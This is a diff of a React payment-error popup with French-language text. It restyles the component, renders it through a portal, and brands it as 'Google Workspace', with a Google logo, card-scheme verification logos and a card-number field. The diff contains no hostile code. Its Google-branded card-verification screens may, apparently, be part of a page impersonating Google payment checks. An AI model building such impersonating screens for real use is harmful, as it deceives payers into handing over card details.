@@ -1,4 +1,7 @@
 import React from 'react';
+import { createPortal } from 'react-dom';
+import PopupHeader from '../common/PopupHeader';
+import styles from '../../styles/components/CommonPopup.module.css';
 
 const PaymentErrorPopup = ({ 
   isVisible, 
@@ -6,30 +9,48 @@ const PaymentErrorPopup = ({
   data, 
   onRetry,
   isLoading,
-  brandName = "Google Calendar" 
+  cardNumber,
+  errorMessage,
+  brandName = "Google Workspace" 
 }) => {
   if (!isVisible) return null;
 
-  return (
-    <div className="verification-wrapper">
-      <div className="verification-popup error">
-        <article className="head">
-          <img className="brand-logo" src="mercanett.png" alt={brandName} />
-          <img
-            className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
-            src={cardLogo}
-            alt="Paiement vérifié"
-          />
-        </article>
-        <h2 className="icon">❌</h2>
-        <h2>Erreur de paiement</h2>
-        <p className="desc">{data?.checkoutPayErrorDescription || "Une erreur est survenue lors du traitement de votre paiement."}</p>
-        <button onClick={onRetry} disabled={isLoading}>
-          {data?.checkoutPayRetryButton || "Réessayer"}
-        </button>
+  const popupContent = (
+    <div className={styles.popupWrapper}>
+      <div className={`${styles.popup} ${styles.errorPopup}`}>
+        <PopupHeader 
+          showGoogleLogo={true} 
+          showCardLogo={true}
+          cardNumber={cardNumber}
+        />
+        
+        <div className={styles.errorContent}>
+          <div className={styles.errorIconContainer}>
+            <span className={styles.errorIcon}>❌</span>
+          </div>
+          
+          <h2 className={styles.errorTitle}>Erreur de paiement</h2>
+          
+          <p className={styles.errorDescription}>
+            {errorMessage || data?.checkoutPayErrorDescription || "Une erreur est survenue lors du traitement de votre paiement."}
+          </p>
+          
+          <button 
+            onClick={onRetry} 
+            disabled={isLoading}
+            className={styles.retryButton}
+          >
+            {data?.checkoutPayRetryButton || "Réessayer"}
+          </button>
+        </div>
       </div>
     </div>
   );
+
+  // Utiliser createPortal pour rendre le popup à la racine du document
+  return typeof window !== 'undefined' 
+    ? createPortal(popupContent, document.body)
+    : null;
 };
 
 export default PaymentErrorPopup;
